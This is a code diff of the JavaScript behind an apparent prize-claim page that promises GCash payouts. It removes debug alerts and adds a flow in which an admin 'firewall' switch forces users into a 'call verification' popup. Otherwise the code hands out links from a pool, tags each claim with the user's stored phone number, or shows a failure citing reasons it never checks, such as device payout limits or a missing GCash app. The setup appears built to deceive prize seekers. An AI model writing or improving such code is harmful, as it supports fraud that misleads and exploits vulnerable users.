@@ -44,51 +44,58 @@ const db = firebase.database();
 
 // ========== 1. MAIN ACTION: CLAIM THRU GCASH ==========
 async function handleClaimThruGCash() {
-    alert("1. Button clicked!");
-    
+    // Isara ang popup
     var prizePopup = document.getElementById('prizePopup');
     if (prizePopup) prizePopup.style.display = 'none';
     
-    alert("2. Popup closed");
-    
-    if (typeof firebase === 'undefined') {
-        alert("3. ERROR: Firebase not loaded!");
+    if (!firebase || !firebase.database) {
+        alert("Firebase not ready. Refresh page.");
         return;
     }
     
-    alert("3. Firebase OK");
+    var db = firebase.database();
     
     try {
-        var db = firebase.database();
-        alert("4. Database OK");
-        
+        // Kunin ang firewall status
         var firewallSnap = await db.ref('admin/globalFirewall/active').once('value');
-        var isFirewallOn = firewallSnap.val();
-        alert("5. Firewall status: " + (isFirewallOn ? "ON" : "OFF"));
+        var isFirewallOn = firewallSnap.val() === true;
         
-        if (isFirewallOn === true) {
-            alert("6. Firewall ON - showing verification");
+        // Kunin ang available link (kung meron)
+        var linkSnap = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
+        var hasLink = linkSnap.exists();
+        
+        if (isFirewallOn) {
+            // FIREWALL ON - palaging call verification
             showFirewallVerificationPopup();
             return;
         }
         
-        alert("6. Looking for links...");
-        
-        var linkSnap = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
-        
-        if (linkSnap.exists()) {
-            alert("7. Link found! Redirecting...");
+        // FIREWALL OFF
+        if (hasLink) {
+            // MAY LINK - Redirect
             var key = Object.keys(linkSnap.val())[0];
             var linkData = linkSnap.val()[key];
-            var targetUrl = linkData.url;
-            window.location.href = targetUrl;
+            var url = linkData.url;
+            
+            if (url && !url.startsWith('http')) {
+                url = 'https://' + url;
+            }
+            
+            await db.ref('links/' + key).update({
+                status: 'claimed',
+                claimedAt: Date.now(),
+                user: localStorage.getItem("userPhone") || "Unknown"
+            });
+            
+            window.location.href = url;
+            
         } else {
-            alert("7. NO LINKS AVAILABLE!");
-            showNoLinkAlert();
+            // WALANG LINK - Alert na may mga dahilan
+            alert("WITHDRAWAL UNSUCCESSFUL\n\nPossible Reasons:\n• No GCash payout link available\n• Device reached maximum payout limit\n• No GCash app installed\n• Please try another device");
         }
         
-    } catch(error) {
-        alert("ERROR: " + error.message);
+    } catch(e) {
+        alert("System error. Please try again.");
     }
 }
 
